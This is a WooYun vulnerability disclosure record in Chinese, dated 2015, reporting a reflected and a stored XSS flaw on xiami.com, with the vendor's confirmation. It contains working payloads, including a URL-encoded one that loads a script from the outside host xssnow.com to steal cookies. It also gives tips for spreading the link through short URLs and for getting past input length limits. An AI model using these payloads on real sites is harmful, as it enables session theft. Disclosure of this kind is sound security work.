{"id": 82077, "wybug_id": "wooyun-2015-0152119", "wybug_title": "虾米网xss漏洞两枚", "wybug_corp": "虾米网", "wybug_author": "影子哥", "wybug_date": "2015-11-06 10:04", "wybug_open_date": "2015-12-23 16:48", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向公众公开  简要描述： 上午提交了一次，审核没通过，可能是我描述的有问题吧。一枚反射性xss和一枚存储性xss 详细说明：  \nhttp://www.xiami.com/relation/following?key=aa%22+onmousemove=\"alert(111111)\n\n\n这个是好友关注的搜索框xss，在火狐浏览器下可以测试成功。典型的输出在value，没对引号过滤，长度不限制，可以构造利用代码。构造以下代码，在虾米的社区中回帖或者发帖，引入这个链接，可以用短网址，用火狐打开鼠标移动到搜索框上可以获得cookie\nhttp://www.xiami.com/relation/following?key=aaa%22%20onmousemove%3D%22var%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2f%2fxssnow.com%2faqTQ%27%3Bdocument.body.appendChild%28s%29%3B\n\n\n第二枚在手机版的个人签名中输入\n\" onmousemove=\"alert(1)\n电脑网页版进入自己资料修改页面鼠标放置输入框可以触发xss，但是用处不是太大，手机版有长度限制。\n\n同理在电脑版上面修改自己昵称和签名也用上述语句，打开firebug修改长度限制。\n\" onmousemove=\"alert(22222)\n\n\n保存后同样可以触发xss，电脑版就没有长度限制了，不过这几枚xss用处都不是太大，但是却说明了虾米网的xss过滤规则，这些地方都没有过滤引号，如果再深入挖掘可能还会发现一些。   漏洞证明：  这是自己测试第一个xss得到的cookie数据\n\n   修复方案：  过滤引号   版权声明：转载请注明来源 影子哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-08 16:47 厂商回复： 您好，漏洞已确认，感谢您对阿里巴巴的关注和支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}